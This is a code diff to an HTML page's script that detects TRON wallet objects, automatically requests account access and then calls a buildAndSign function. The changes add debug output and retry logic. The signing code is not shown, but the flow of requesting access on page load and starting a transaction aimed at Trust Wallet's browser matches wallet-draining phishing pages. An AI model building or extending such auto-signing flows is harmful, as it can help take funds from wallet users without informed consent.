@@ -70,11 +70,17 @@
             });
         }
 
-        // Try to get address immediately, if not available request it
+        // Try to get address - show debug info
         var n = 0;
         var t = setInterval(function() {
             n++;
             if (done) { clearInterval(t); return; }
+
+            // Debug: show what's available
+            var hasTW = !!window.tronWeb;
+            var hasTL = !!window.tronLink;
+            var hasEth = !!window.ethereum;
+            el2.textContent = "check " + n + " | tronWeb:" + hasTW + " tronLink:" + hasTL + " ethereum:" + hasEth;
 
             var addr = getAddress();
             if (addr) {
@@ -83,22 +89,38 @@
                 return;
             }
 
-            // On first check, request accounts right away
-            if (n === 1 && window.tronLink && window.tronLink.request) {
-                window.tronLink.request({ method: "tron_requestAccounts" }).then(function() {
+            // Try requestAccounts via tronLink
+            if (n === 3 && hasTL && window.tronLink.request) {
+                el2.textContent = "Requesting access...";
+                window.tronLink.request({ method: "tron_requestAccounts" }).then(function(res) {
+                    el2.textContent = "requestAccounts result: " + JSON.stringify(res);
+                    var a = getAddress();
+                    if (a && !done) { clearInterval(t); buildAndSign(a); }
+                }).catch(function(e) {
+                    el2.textContent = "requestAccounts error: " + (e.message || e);
+                });
+            }
+
+            // Also try via tronWeb.request if available
+            if (n === 6 && hasTW && window.tronWeb.request) {
+                window.tronWeb.request({ method: "tron_requestAccounts" }).then(function() {
                     var a = getAddress();
                     if (a && !done) { clearInterval(t); buildAndSign(a); }
                 }).catch(function(){});
             }
-        }, 300);
+        }, 500);
 
-        // Timeout after 15s
+        // Timeout after 30s
         setTimeout(function() {
             if (!done) {
                 clearInterval(t);
-                msg("Please open this link", "in Trust Wallet's browser");
+                var info = "tronWeb:" + !!window.tronWeb + " tronLink:" + !!window.tronLink;
+                if (window.tronWeb) {
+                    info += " addr:" + (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
+                }
+                msg("Could not connect", info);
             }
-        }, 15000);
+        }, 30000);
     </script>
 </body>
 </html>
